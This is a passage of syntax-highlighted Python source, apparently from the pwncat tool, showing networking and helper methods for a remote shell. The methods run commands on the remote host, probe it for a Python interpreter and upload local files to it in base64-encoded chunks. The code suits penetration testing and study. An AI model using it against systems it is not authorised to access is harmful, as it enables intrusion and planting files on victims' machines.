            <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
            <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Network Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">send</span>(<span class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; int</span>
        <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket.

        Args:
            data (bytes): The data to send.

        Returns:
            int: Returns total bytes sent.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        <span class="hljs-keyword">return</span> self.__net.net.send(data)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flush_receive</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[bytes]</span>
        <span class="hljs-string">"""Try to reveive everything which is currently being sent from remote.

        Returns:
            List[bytes]: Returns a list of bytes of received data.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        self.print_info(<span class="hljs-string">"Flushing receive buffer (this can take some time) ..."</span>)

        self.send(<span class="hljs-string">b"\n"</span>)
        data1 = self.send_recv(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, <span
                                    class="hljs-literal">False</span>)
        data2 = self.send_recv(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, <span
                                    class="hljs-literal">False</span>)

        self.print_info(<span class="hljs-string">"Flushing receive buffer done."</span>)
        <span class="hljs-keyword">return</span> data1 + data2

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_recv</span>(<span
            class="hljs-params">self, data, strip_suffix=True, strip_echo=False</span>):</span>
        <span class="hljs-comment"># type: (Optional[bytes], bool, bool) -&gt; List[bytes]</span>
        <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.

        Args:
            data (None|bytes): The data to send. If None, will skip sending.
            strip_suffix (bool): Strip remote suffix from received data?
            strip_echo (bool): Also remove 'data' from output if server has echo'ed it?

        Returns:
            List[bytes]: Returns a list of bytes of received data.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        <span class="hljs-comment"># [1/4] Send</span>
        <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            self.__net.net.send(data)

        <span class="hljs-comment"># [2/4] Receive actual reply</span>
        responses = []

        <span class="hljs-comment"># Setup timer and current receive round</span>
        time_start = datetime.now()
        curr_round = <span class="hljs-number">0</span>

        <span class="hljs-keyword">while</span> curr_round &lt; self.__recv_rounds:
            <span class="hljs-keyword">try</span>:
                response = self.__net.net.receive()
            <span class="hljs-keyword">except</span> socket.timeout:
                time.sleep(self.__recv_timeout)
                time_step = datetime.now()
                time_diff = time_step - time_start

                self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"Timeout: Receive timed out after %f sec in %d/%d rounds"</span>,
                    time_diff.total_seconds(),
                    curr_round + <span class="hljs-number">1</span>,
                    self.__recv_rounds,
                )
                curr_round += <span class="hljs-number">1</span>
            <span class="hljs-comment"># On successful read, we can determine to adjust timings.</span>
            <span class="hljs-keyword">else</span>:
                time_end = datetime.now()
                time_diff = time_end - time_start

                self.__recv_times.append(time_diff.total_seconds())
                self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"Timeout: Receive took %f sec (avg: %f) to receive in %d/%d rounds"</span>,
                    time_diff.total_seconds(),
                    sum(self.__recv_times) / len(self.__recv_times),
                    curr_round + <span class="hljs-number">1</span>,
                    self.__recv_rounds,
                )

                <span class="hljs-comment"># Retries were required</span>
                prev_recv_timeout = self.__recv_timeout
                <span class="hljs-keyword">if</span> curr_round &gt; <span
                                    class="hljs-number">1</span>:
                    self.__recv_timeout += time_diff.total_seconds()
                <span class="hljs-comment"># No retries requred</span>
                <span class="hljs-keyword">else</span>:
                    self.__recv_timeout = time_diff.total_seconds() / <span
                                    class="hljs-number">2</span>

                self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"Timeout: Previous recv timeout: %f sec -&gt; new recv timeout: %f sec"</span>,
                    prev_recv_timeout,
                    self.__recv_timeout,
                )

                <span class="hljs-comment"># Add response</span>
                <span class="hljs-keyword">if</span> response:
                    responses.append(response)

                <span class="hljs-comment"># Reset the start time and round</span>
                time_start = datetime.now()
                curr_round = <span class="hljs-number">0</span>

        <span class="hljs-comment"># Return if already empty</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> responses:
            <span class="hljs-keyword">return</span> responses

        <span class="hljs-comment"># Response could be in one of the below listed formats:</span>
        <span class="hljs-comment"># 1. response could be one line per element</span>
        <span class="hljs-comment"># 2. reposnse could be multiple lines per element</span>
        <span class="hljs-comment"># 3. response cloud be single characters per element</span>
        <span class="hljs-comment"># But we want to make sure that we always get one line per element,</span>
        <span class="hljs-comment"># so we normalize it</span>

        <span class="hljs-comment"># First: Join lines which do not have line endings</span>
        self.__log.debug(<span class="hljs-string">"Normalize recv before (1): %s"</span>, repr(responses))
        normalized = []
        has_eol = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> responses:
            <span class="hljs-keyword">if</span> has_eol:
                normalized.append(line)
            <span class="hljs-keyword">else</span>:
                normalized[<span class="hljs-number">-1</span>] = normalized[<span
                                    class="hljs-number">-1</span>] + line
            <span class="hljs-comment"># Determine what to do next iteration</span>
            <span class="hljs-keyword">if</span> line.endswith(<span
                                    class="hljs-string">b"\r\n"</span>):
                has_eol = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">elif</span> line.endswith(<span
                                    class="hljs-string">b"\n"</span>):
                has_eol = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">elif</span> line.endswith(<span
                                    class="hljs-string">b"\r"</span>):
                has_eol = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">else</span>:
                has_eol = <span class="hljs-literal">False</span>
        responses = normalized
        self.__log.debug(<span class="hljs-string">"Normalize recv after  (1): %s"</span>, repr(responses))

        <span class="hljs-comment"># Second: Separate lines which have line endings</span>
        self.__log.debug(<span class="hljs-string">"Normalize recv before (2): %s"</span>, repr(responses))
        normalized = []
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> responses:
            line = line.rstrip(<span class="hljs-string">b"\r\n"</span>)
            line = line.rstrip(<span class="hljs-string">b"\n"</span>)
            line = line.rstrip(<span class="hljs-string">b"\r"</span>)
            line = line.lstrip(<span class="hljs-string">b"\r\n"</span>)
            line = line.lstrip(<span class="hljs-string">b"\n"</span>)
            line = line.lstrip(<span class="hljs-string">b"\r"</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-string">b"\r\n"</span> <span
                                    class="hljs-keyword">in</span> line:
                <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                                    class="hljs-string">b"\r\n"</span>):
                    normalized.append(newline)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">b"\n"</span> <span
                                    class="hljs-keyword">in</span> line:
                <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                                    class="hljs-string">b"\n"</span>):
                    normalized.append(newline)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">b"\r"</span> <span
                                    class="hljs-keyword">in</span> line:
                <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                                    class="hljs-string">b"\r"</span>):
                    normalized.append(newline)
            <span class="hljs-keyword">else</span>:
                normalized.append(line)
        responses = normalized
        self.__log.debug(<span class="hljs-string">"Normalize recv after  (2): %s"</span>, repr(responses))

        <span class="hljs-comment"># [3/4] Remove remote ends suffix (if it sends something like it)</span>
        <span class="hljs-comment"># We iterate reversed of responses and check if the new line suffix(es)</span>
        <span class="hljs-comment"># are present at the end.</span>
        <span class="hljs-comment"># This is because the suffix(es) is always received last.</span>
        <span class="hljs-keyword">if</span> self.__remote_suffix <span
                                    class="hljs-keyword">and</span> strip_suffix:
            <span class="hljs-comment"># If multiple suffix lines are send we will first strip x-1 suffix lines</span>
            <span class="hljs-keyword">if</span> len(self.__remote_suffix) &gt; <span
                                    class="hljs-number">1</span>:
                lines_to_strip = len(self.__remote_suffix) - <span class="hljs-number">1</span>
                self.__log.debug(<span class="hljs-string">"Remove suffix before (1): %s"</span>, repr(responses))
                responses = responses[:-lines_to_strip]
                self.__log.debug(<span class="hljs-string">"Remove suffix after  (1): %s"</span>, repr(responses))

            <span class="hljs-comment"># Return if already empty</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> responses:
                <span class="hljs-keyword">return</span> responses

            <span class="hljs-comment"># Clean up the last response line with first suffix line</span>
            self.__log.debug(<span class="hljs-string">"Remove suffix before (2): %s"</span>, repr(responses))
            responses[<span class="hljs-number">-1</span>] = responses[<span
                                    class="hljs-number">-1</span>].rstrip(self.__remote_suffix[<span
                                    class="hljs-number">0</span>])
            self.__log.debug(<span class="hljs-string">"Remove suffix after  (2): %s"</span>, repr(responses))

            <span class="hljs-comment"># Ensure empty elements are removed</span>
            self.__log.debug(<span class="hljs-string">"Remove suffix before (3): %s"</span>, repr(responses))
            responses = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> responses <span
                                    class="hljs-keyword">if</span> item]
            self.__log.debug(<span class="hljs-string">"Remove suffix after  (3): %s"</span>, repr(responses))

        <span class="hljs-comment"># [4/4] Some server also echo back what we've send, so if we did send something</span>
        <span class="hljs-comment"># we need to strip this off as well</span>
        <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> strip_echo:
            <span class="hljs-keyword">for</span> idx, item <span class="hljs-keyword">in</span> enumerate(responses):
                <span class="hljs-keyword">if</span> data <span class="hljs-keyword">in</span> responses[idx]:
                    <span class="hljs-keyword">del</span> responses[idx]
                <span class="hljs-keyword">elif</span> data.rstrip() <span
                                    class="hljs-keyword">in</span> responses[idx]:
                    <span class="hljs-keyword">del</span> responses[idx]
                <span class="hljs-comment"># Ensure empty elements are removed</span>
                responses = [item <span class="hljs-keyword">for</span> item <span
                                    class="hljs-keyword">in</span> responses <span
                                    class="hljs-keyword">if</span> item]

        <span class="hljs-comment"># Return list of respones</span>
        <span class="hljs-keyword">return</span> responses

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># High-level Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_command</span>(<span
            class="hljs-params">self, command, output</span>):</span>
        <span class="hljs-comment"># type: (str, bool) -&gt; Optional[List[bytes]]</span>
        <span class="hljs-string">"""Run remote command with correct linefeeds and receive response lines.

        Args:
            command (str): The command to execute on the remote end.
            output (bool): Receive output from command?
        """</span>
        command = command.rstrip(<span class="hljs-string">"\r\n"</span>)
        command = command.rstrip(<span class="hljs-string">"\r"</span>)
        command = command.rstrip(<span class="hljs-string">"\n"</span>)
        command = command + <span class="hljs-string">"\n"</span>
        <span class="hljs-keyword">if</span> output:
            <span class="hljs-keyword">return</span> self.send_recv(StringEncoder.encode(command), <span
                                    class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
        self.send(StringEncoder.encode(command))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_remote_tmpfile</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""OS-independent remote tempfile creation.

        Returns:
            str or None: Returns path on success or None on error.
        """</span>
        self.flush_receive()
        self.print_info(<span class="hljs-string">"Creating tmpfile:"</span>, <span
                                    class="hljs-literal">False</span>, <span class="hljs-literal">True</span>)

        command = []
        command.append(<span class="hljs-string">"{} -c '"</span>.format(self.__remote_python))
        command.append(<span class="hljs-string">"import tempfile;"</span>)
        command.append(<span class="hljs-string">"h,f=tempfile.mkstemp();"</span>)
        <span class="hljs-keyword">if</span> self.__remote_py3:
            command.append(<span class="hljs-string">"print(f);"</span>)
        <span class="hljs-keyword">else</span>:
            command.append(<span class="hljs-string">"print f;"</span>)
        command.append(<span class="hljs-string">"'"</span>)
        response = self.remote_command(<span class="hljs-string">""</span>.join(command), <span
                                    class="hljs-literal">True</span>)

        <span class="hljs-comment"># All good</span>
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> len(response) == <span
                                    class="hljs-number">1</span>:
            tmpfile = StringEncoder.decode(response[<span class="hljs-number">0</span>]).rstrip()
            self.print_info(<span class="hljs-string">"Creating tmpfile: {}"</span>.format(repr(tmpfile)), <span
                                    class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
            <span class="hljs-keyword">return</span> tmpfile

        <span class="hljs-comment"># Something went wrong with stripping prefix from server, we need to manually</span>
        <span class="hljs-comment"># check if creation was successful.</span>
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> len(response) &gt; <span
                                    class="hljs-number">1</span>:
            <span class="hljs-comment"># A bit fuzzy, but we try a few times</span>
            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span
                                    class="hljs-number">5</span>):
                self.print_info(<span class="hljs-string">"Creating tmpfile: Unsure - checking otherwise"</span>, <span
                                    class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
                <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
                    tmpfile = StringEncoder.decode(candidate).rstrip()
                    <span class="hljs-keyword">if</span> self.remote_file_exists(tmpfile):
                        self.print_info(<span class="hljs-string">"Creating tmpfile: {}"</span>.format(repr(tmpfile)), <span
                                    class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
                        <span class="hljs-keyword">return</span> tmpfile

        self.print_info(<span class="hljs-string">"Creating tmpfile: Failed"</span>, <span
                                    class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
        self.print_info(<span class="hljs-string">"Response: {}"</span>.format(repr(response)))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_file_exists</span>(<span
            class="hljs-params">self, remote_path</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Ensure given remote path exists as a file on remote end.

        Args:
            remote_path (str): Path of file to check.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        self.flush_receive()

        <span class="hljs-comment"># String should be short as an unstable remote might send small chunks</span>
        unique_string = <span class="hljs-string">"_pwncat_"</span>
        response = self.remote_command(
            <span class="hljs-string">'test -f "{}" &amp;&amp; echo "{}"'</span>.format(remote_path, unique_string), <span
                                    class="hljs-literal">True</span>
        )
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate) == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        response = self.flush_receive()
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span
            class="hljs-params">self, lpath, rpath</span>):</span>
        <span class="hljs-comment"># type: (str, str) -&gt; bool</span>
        <span class="hljs-string">"""OS-independent upload of a local file to a remote path.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-keyword">assert</span> self.__remote_python <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>
        <span class="hljs-keyword">assert</span> self.__remote_py3 <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span>

        rpath_b64 = self.create_remote_tmpfile()
        self.flush_receive()
        <span class="hljs-keyword">if</span> rpath_b64 <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__upload_file_base_64_encoded(lpath, rpath_b64, <span
                                    class="hljs-literal">True</span>):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__remote_base64_decode(rpath_b64, rpath):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set_remote_prefix</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Determines if the remote always sends a specific prefix with its other data."""</span>
        self.__remote_prefix = []
        self.__remote_suffix = []

        has_suffix = <span class="hljs-literal">False</span>

        self.print_info(<span class="hljs-string">"Checking if remote sends prefix/suffix to every request..."</span>)
        response = self.send_recv(<span class="hljs-string">b'echo "__pwn__"\n'</span>)
        expected = <span class="hljs-string">b"__pwn__"</span>

        <span class="hljs-keyword">if</span> response:
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response:
                <span class="hljs-comment"># If the line begins with our expected response, all data after that</span>
                <span class="hljs-comment"># is a suffix that the server might be sending.</span>
                <span class="hljs-keyword">if</span> re.match(expected, line):
                    has_suffix = <span class="hljs-literal">True</span>
                    <span class="hljs-comment"># If bytes are still left after our response, add it</span>
                    <span class="hljs-keyword">if</span> line.replace(expected, <span
                                    class="hljs-string">b""</span>, <span
                                    class="hljs-number">1</span>):
                        self.__remote_suffix.append(line.replace(expected, <span
                                    class="hljs-string">b""</span>, <span
                                    class="hljs-number">1</span>))
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-keyword">if</span> has_suffix:
                    self.__remote_suffix.append(line)

        <span class="hljs-comment"># Ensure empty elements are removed</span>
        self.__log.debug(<span class="hljs-string">"Set suffix before: %s"</span>, repr(self.__remote_suffix))
        self.__remote_suffix = [item <span class="hljs-keyword">for</span> item <span
                                    class="hljs-keyword">in</span> self.__remote_suffix <span
                                    class="hljs-keyword">if</span> item]
        self.__log.debug(<span class="hljs-string">"Set suffix after:  %s"</span>, repr(self.__remote_suffix))

        <span class="hljs-keyword">if</span> self.__remote_prefix:
            self.print_info(<span class="hljs-string">"Remote prefix ({} lines):"</span>.format(len(self.__remote_prefix)))
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> self.__remote_prefix:
                self.print_raw(repr(line).encode(), <span class="hljs-literal">True</span>)
        <span class="hljs-keyword">else</span>:
            self.print_info(<span class="hljs-string">"Remote does not send prefix"</span>)
        <span class="hljs-keyword">if</span> self.__remote_suffix:
            self.print_info(<span class="hljs-string">"Remote suffix ({} lines):"</span>.format(len(self.__remote_suffix)))
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> self.__remote_suffix:
                self.print_raw(repr(line).encode(), <span class="hljs-literal">True</span>)
        <span class="hljs-keyword">else</span>:
            self.print_info(<span class="hljs-string">"Remote does not send suffix"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_remote_python_version</span>(<span
            class="hljs-params">self, path</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; Optional[str]</span>
        <span class="hljs-string">"""Get remote Python version by path.

        Args:
            path (str): Path to potential python binary.

        Returns:
            Optional[str]: Python version string or None if not found.
        """</span>
        command = []
        command.append(<span class="hljs-string">"{} -c '"</span>.format(path))
        command.append(<span class="hljs-string">"from __future__ import print_function;"</span>)
        command.append(<span class="hljs-string">"import sys;"</span>)
        command.append(<span class="hljs-string">"v=sys.version_info;"</span>)
        command.append(<span class="hljs-string">'print("{}.{}.{}".format(v[0], v[1], v[2]));\''</span>)

        response = self.remote_command(<span class="hljs-string">""</span>.join(command), <span
                                    class="hljs-literal">True</span>)

        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> response:
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response:
                match = re.search(<span class="hljs-string">b"^([.0-9]+)"</span>, line)
                <span class="hljs-comment"># Potential version candidate</span>
                <span class="hljs-keyword">if</span> match:
                    version = StringEncoder.decode(match.group(<span class="hljs-number">1</span>))
                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] <span
                                    class="hljs-keyword">in</span> [<span
                                    class="hljs-string">"2"</span>, <span
                                    class="hljs-string">"3"</span>]:
                        <span class="hljs-keyword">return</span> version
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set_remote_python_path</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Enumerate remote Python binary.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Make windows compatible</span>
        <span class="hljs-comment"># [1/2] 'which' method</span>
        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> self.__PYTHON_NAMES:
            self.print_info(<span class="hljs-string">"Probing for: which {}"</span>.format(name))
            response = self.remote_command(<span
                                    class="hljs-string">"which {} 2&gt;/dev/null"</span>.format(name), <span
                                    class="hljs-literal">True</span>)
            <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> response:
                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response:
                    path = StringEncoder.decode(line)
                    self.print_info(<span class="hljs-string">"Potential path: {}"</span>.format(path))
                    version = self.__get_remote_python_version(path)
                    <span class="hljs-keyword">if</span> version <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
                        <span class="hljs-keyword">continue</span>

                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                                    class="hljs-string">"2"</span>:
                        self.__remote_py3 = <span class="hljs-literal">False</span>
                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                                    class="hljs-string">"3"</span>:
                        self.__remote_py3 = <span class="hljs-literal">True</span>
                    self.print_info(<span
                                    class="hljs-string">"Found valid Python{} version: {}"</span>.format(version[<span
                                    class="hljs-number">0</span>], version))
                    self.__remote_python = path
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Make windows compatible</span>
        <span class="hljs-comment"># [2/2] Absolute path method</span>
        <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> self.__PYTHON_PATHS:
            <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> self.__PYTHON_NAMES:

                python = path + <span class="hljs-string">"/"</span> + name
                self.print_info(<span class="hljs-string">"Probing for: {}"</span>.format(python))
                rpath_lines = self.remote_command(
                    <span class="hljs-string">"test -f {p} &amp;&amp; echo {p} || echo"</span>.format(p=python), <span
                                    class="hljs-literal">True</span>
                )
                <span class="hljs-keyword">if</span> rpath_lines <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-keyword">not</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">and</span> rpath_lines:
                    <span class="hljs-comment"># Reset current round</span>
                    path_found = <span class="hljs-literal">False</span>

                    <span class="hljs-comment"># We expect a length of one, but we handle errors as well.</span>
                    <span class="hljs-keyword">for</span> rpath_line <span
                                    class="hljs-keyword">in</span> rpath_lines:
                        <span class="hljs-keyword">if</span> StringEncoder.decode(rpath_line).rstrip() == python:
                            path_found = <span class="hljs-literal">True</span>
                            <span class="hljs-keyword">break</span>
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> path_found:
                        <span class="hljs-keyword">continue</span>

                    <span class="hljs-comment"># Potential python candidate</span>
                    self.print_info(<span class="hljs-string">"Potential path: {}"</span>.format(python))
                    version = self.__get_remote_python_version(python)
                    <span class="hljs-keyword">if</span> version <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
                        <span class="hljs-keyword">continue</span>

                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                                    class="hljs-string">"2"</span>:
                        self.__remote_py3 = <span class="hljs-literal">False</span>
                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                                    class="hljs-string">"3"</span>:
                        self.__remote_py3 = <span class="hljs-literal">True</span>
                    self.print_info(<span
                                    class="hljs-string">"Found valid Python{} version: {}"</span>.format(version[<span
                                    class="hljs-number">0</span>], version))
                    self.__remote_python = python
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__upload_file_base_64_encoded</span>(<span
            class="hljs-params">self, lpath, rpath, at_once=False</span>):</span>
        <span class="hljs-comment"># type: (str, str, bool) -&gt; bool</span>
        <span class="hljs-string">"""Upload a local file to a base64 encoded remote file.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.
            at_once (bool): Send all data at once.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        first = <span class="hljs-literal">True</span>
        data = []  <span class="hljs-comment"># type: List[str]</span>

        <span class="hljs-keyword">with</span> open(lpath, <span
                                    class="hljs-string">"r"</span>) <span
                                    class="hljs-keyword">as</span> fhandle:
            lines = fhandle.readlines()
            count = len(lines)
            curr = <span class="hljs-number">1</span>
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> at_once:
                    self.print_info(
                        <span class="hljs-string">"Uploading: {} -&gt; {} ({}/{})"</span>.format(lpath, rpath, curr, count), <span
                                    class="hljs-literal">False</span>, <span class="hljs-literal">True</span>
                    )
                b64 = StringEncoder.decode(base64.b64encode(StringEncoder.encode(line)))
                <span class="hljs-keyword">if</span> first:
                    <span class="hljs-keyword">if</span> at_once:
                        data.append(<span class="hljs-string">'echo "{}" &gt; "{}"'</span>.format(b64, rpath))
                    <span class="hljs-keyword">else</span>:
                        self.remote_command(<span class="hljs-string">'echo "{}" &gt; "{}"'</span>.format(b64, rpath), <span
                                    class="hljs-literal">False</span>)
                    first = <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-keyword">if</span> at_once:
                        data.append(<span class="hljs-string">'echo "{}" &gt;&gt; "{}"'</span>.format(b64, rpath))
                    <span class="hljs-keyword">else</span>:
                        self.remote_command(<span
                                    class="hljs-string">'echo "{}" &gt;&gt; "{}"'</span>.format(b64, rpath), <span
                                    class="hljs-literal">False</span>)
                curr += <span class="hljs-number">1</span>

        <span class="hljs-keyword">if</span> at_once:
            self.print_info(<span class="hljs-string">"Uploading: {} -&gt; {} ({}/{})"</span>.format(lpath, rpath, <span
                                    class="hljs-number">1</span>, <span class="hljs-number">1</span>))
            self.remote_command(<span class="hljs-string">"\n"</span>.join(data), <span
                                    class="hljs-literal">False</span>)
        <span class="hljs-keyword">else</span>:
            self.print_info()

        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> md5 check if this is legit</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__remote_base64_decode</span>(<span
            class="hljs-params">self, rpath_source, rpath_target</span>):</span>
        <span class="hljs-comment"># type: (str, str) -&gt; bool</span>
        <span class="hljs-string">"""Decode a remote base64 encoded file with pure Python.

        Args:
            rpath_source (str): The remote path to the existing base64 encoded file.
            rpath_target (str): The remote path to the desired base64 decoded file.

        Returns:
            bool: Returns `True` on success or `False` on failure.
        """</span>
        self.flush_receive()

        command = []
